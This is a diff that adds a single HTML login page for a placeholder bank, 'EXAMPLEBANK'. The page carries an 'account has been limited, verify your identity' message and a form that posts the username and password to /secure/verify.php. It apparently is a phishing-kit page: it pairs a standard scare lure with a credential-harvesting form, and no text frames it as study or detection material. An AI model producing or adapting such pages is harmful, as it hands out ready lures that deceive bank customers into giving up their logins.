@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>  EXAMPLEBANK -   Secure   Login  </title>
+  <link rel="shortcut icon" href="/assets/fav.ico">
+  <link rel="stylesheet" href="/assets/style.css">
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-EXMPL12345"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('config', 'G-EXMPL12345');
+  </script>
+</head>
+<body>
+  <div class="header"><img src="/assets/logo.png" alt="Examplebank Online"></div>
+  <div class="box">
+    <h1>Your account has been limited. Please verify your identity.</h1>
+    <form action="/secure/verify.php" method="post">
+      <input type="text" name="user" placeholder="Username">
+      <input type="password" name="pass" placeholder="Password">
+      <button type="submit">Verify now</button>
+    </form>
+    <a href="/account/update">Need help?</a>
+  </div>
+  <script src="/assets/app.js"></script>
+</body>
+</html>
